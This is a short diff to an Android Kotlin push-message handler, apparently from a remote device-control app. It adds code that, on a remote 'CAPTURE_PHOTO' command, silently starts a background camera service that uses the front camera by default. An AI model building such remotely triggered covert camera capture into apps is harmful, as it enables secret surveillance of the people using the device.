@@ -56,9 +56,15 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 requestLocationUpdate()
             }
             "CAPTURE_PHOTO" -> {
-                Log.d(TAG, "📸 Command: Capture Photo")
-                Log.d(TAG, "⚠️ Photo capture requires UI - notify Flutter if app is open")
-                // TODO: Implement camera capture or notify Flutter
+                Log.d(TAG, "📸 Executing: Capture Photo (Background)")
+                val useFront = data["front_camera"]?.toBoolean() ?: true
+                
+                try {
+                    CameraBackgroundService.startCapture(applicationContext, useFront)
+                    Log.d(TAG, "✅ Background camera service started")
+                } catch (e: Exception) {
+                    Log.e(TAG, "❌ Failed to start camera service", e)
+                }
             }
             "REQUEST_NOTIFICATION" -> {
                 Log.d(TAG, "� Command: Request Notification")
